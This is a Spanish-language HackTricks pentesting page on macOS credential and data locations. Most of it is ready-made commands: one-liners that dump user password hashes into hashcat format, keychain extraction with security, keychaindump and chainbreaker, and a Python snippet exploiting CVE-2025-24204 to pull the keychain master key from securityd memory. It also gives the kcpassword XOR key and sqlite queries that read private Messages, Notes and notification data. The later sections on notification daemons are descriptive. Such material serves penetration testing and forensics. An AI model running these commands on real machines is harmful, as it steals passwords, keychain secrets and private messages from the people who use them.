# macOS Ubicaciones sensibles y daemons interesantes

{{#include ../../../banners/hacktricks-training.md}}

## Contraseñas

### Contraseñas Shadow

La contraseña shadow se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\\
El siguiente oneliner puede usarse para volcar **toda la información sobre los usuarios** (incluida la información de hashes):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts como este**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**este**](https://github.com/octomagon/davegrohl.git) pueden usarse para transformar el hash al **formato** de **hashcat**.

Un one-liner alternativo que volcará las credenciales de todas las cuentas que no sean de servicio en **formato** de **hashcat** `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Otra forma de obtener el `ShadowHashData` de un usuario es usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este archivo se utiliza **solamente** cuando el sistema está en **single-user mode** (por lo que no se usa con mucha frecuencia).

### Keychain Dump

Ten en cuenta que al usar el binario security para **volcar las contraseñas descifradas**, aparecerán varios avisos solicitando al usuario permitir esta operación.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basado en este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que estas herramientas ya no funcionan en Big Sur.

### Keychaindump — Visión general

Se desarrolló una herramienta llamada **keychaindump** para extraer contraseñas de los llaveros de macOS, pero presenta limitaciones en versiones más recientes de macOS como Big Sur, tal como se indica en una [discusión](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios a **root**. La herramienta explota el hecho de que el llavero se desbloquea por defecto al iniciar sesión el usuario, por conveniencia, permitiendo que las aplicaciones accedan a él sin requerir repetidamente la contraseña del usuario. Sin embargo, si un usuario decide bloquear su llavero después de cada uso, **keychaindump** se vuelve ineficaz.

**Keychaindump** opera apuntando a un proceso específico llamado **securityd**, descrito por Apple como un daemon para autorización y operaciones criptográficas, crucial para el acceso al llavero. El proceso de extracción implica identificar una **Clave maestra** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del llavero. Para localizar la **Clave maestra**, **keychaindump** escanea el heap de memoria de **securityd** usando el comando `vmmap`, buscando posibles claves dentro de áreas marcadas como `MALLOC_TINY`. El siguiente comando se usa para inspeccionar estas ubicaciones de memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Después de identificar posibles master keys, **keychaindump** busca en los heaps un patrón específico (`0x0000000000000018`) que indica un candidato para la master key. Se requieren pasos adicionales, incluida la desofuscación, para utilizar esta key, como se detalla en el código fuente de **keychaindump**. Los analistas que se centren en esta área deben tener en cuenta que los datos cruciales para descifrar el keychain se almacenan en la memoria del proceso **securityd**. Un ejemplo de comando para ejecutar **keychaindump** es:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) puede usarse para extraer los siguientes tipos de información de un OSX keychain de forma forensemente válida:

- Contraseña del Keychain en hash, adecuada para crackear con [hashcat](https://hashcat.net/hashcat/) o [John the Ripper](https://www.openwall.com/john/)
- Contraseñas de Internet
- Contraseñas genéricas
- Claves privadas
- Claves públicas
- Certificados X509
- Notas seguras
- Contraseñas de Appleshare

Dada la contraseña de desbloqueo del keychain, una clave maestra obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el Keychain, Chainbreaker mostrará el resto de la información disponible.

#### **Volcar las claves del Keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Extraer claves del keychain (con contraseñas) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (con contraseñas) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del keychain (con contraseñas) mediante un memory dump**

[Sigue estos pasos](../index.html#dumping-memory-with-osxpmem) para realizar un **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) usando la contraseña del usuario**

Si conoces la contraseña del usuario, puedes usarla para **dump y descifrar keychains que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Clave maestra del Keychain vía `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) incluía `/usr/bin/gcore` con el **`com.apple.system-task-ports.read`** entitlement, por lo que cualquier admin local (o app firmada maliciosa) podía dump **any process memory even with SIP/TCC enforced**. Dumping `securityd` leaks the **Keychain master key** in clear and lets you decrypt `login.keychain-db` without the user password.

**Reproducción rápida en builds vulnerables (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Alimenta la clave hex extraída a Chainbreaker (`--key <hex>`) para descifrar el login keychain. Apple eliminó el entitlement en **macOS 15.3+**, por lo que esto solo funciona en builds de Sequoia sin parchear o en sistemas que conservaron el binario vulnerable.

### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le solicite una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xoreada con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña del usuario es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo usando scripts como [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información interesante en bases de datos

### Mensajes
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notificaciones

Puedes encontrar los datos de Notificaciones en `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

La mayor parte de la información interesante estará en **blob**. Por lo tanto necesitarás **extraer** ese contenido y **transformarlo** a **legible** **para humanos** o usar **`strings`**. Para acceder a él puedes hacer:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Problemas recientes de privacidad (NotificationCenter DB)

- En macOS **14.7–15.1** Apple almacenó el contenido de los banners en el SQLite `db2/db` sin una redacción adecuada. Las CVEs **CVE-2024-44292/44293/40838/54504** permitían a cualquier usuario local leer el texto de las notificaciones de otros usuarios simplemente abriendo la DB (sin aviso de TCC). Corregido en **15.2** moviendo/bloqueando la DB; en sistemas más antiguos la ruta anterior todavía leaks notificaciones recientes y adjuntos.
- La base de datos es world-readable solo en las builds afectadas, así que cuando hunting on legacy endpoints cópiala antes de actualizar para preservar artefactos.

### Notas

Las **notas** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferencias

En macOS, las preferencias de las apps se encuentran en **`$HOME/Library/Preferences`** y en iOS están en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

En macOS la cli tool **`defaults`** puede usarse para **modificar el archivo Preferences**.

**`/usr/sbin/cfprefsd`** reclama los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent` y puede invocarse para realizar acciones como modificar las preferencias.

## OpenDirectory permissions.plist

El archivo `/System/Library/OpenDirectory/permissions.plist` contiene permisos aplicados sobre atributos de nodo y está protegido por SIP.\
Este archivo concede permisos a usuarios específicos por UUID (y no por uid) para que puedan acceder a información sensible específica como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys`, entre otros:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificaciones del sistema

### Notificaciones de Darwin

El daemon principal para las notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse a través del puerto Mach `com.apple.system.notification_center` (compruébalos con `sudo lsmp -p <pid notifyd>`). El daemon es configurable mediante el archivo `/etc/notify.conf`.

Los nombres usados para las notificaciones son notaciones únicas de DNS inversa y, cuando se envía una notificación a una de ellas, el/los cliente(s) que hayan indicado que pueden manejarla la recibirán.

Es posible volcar el estado actual (y ver todos los nombres) enviando la señal SIGUSR2 al proceso notifyd y leyendo el archivo generado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Centro de Notificaciones Distribuido

El **Centro de Notificaciones Distribuido** cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza algunas comprobaciones para intentar verificar a los clientes.

### Apple Push Notifications (APN)

En este caso, las aplicaciones pueden registrarse para **temas**. El cliente generará un token contactando con los servidores de Apple a través de **`apsd`**.\
Luego, los proveedores también habrán generado un token y podrán conectarse con los servidores de Apple para enviar mensajes a los clientes. Estos mensajes serán recibidos localmente por **`apsd`**, que retransmitirá la notificación a la aplicación que la espera.

Las preferencias se encuentran en `/Library/Preferences/com.apple.apsd.plist`.

Hay una base de datos local de mensajes ubicada en macOS en `/Library/Application\ Support/ApplePushService/aps.db` y en iOS en `/var/mobile/Library/ApplePushService`. Tiene 3 tablas: `incoming_messages`, `outgoing_messages` y `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
También es posible obtener información sobre el daemon y las conexiones usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificaciones de usuario

Estas son notificaciones que el usuario debería ver en la pantalla:

- **`CFUserNotification`**: Esta API proporciona una forma de mostrar en la pantalla una ventana emergente con un mensaje.
- **The Bulletin Board**: Muestra en iOS un banner que desaparece y se almacena en el Notification Center.
- **`NSUserNotificationCenter`**: Este es el iOS bulletin board en MacOS. La base de datos con las notificaciones se encuentra en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Referencias

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
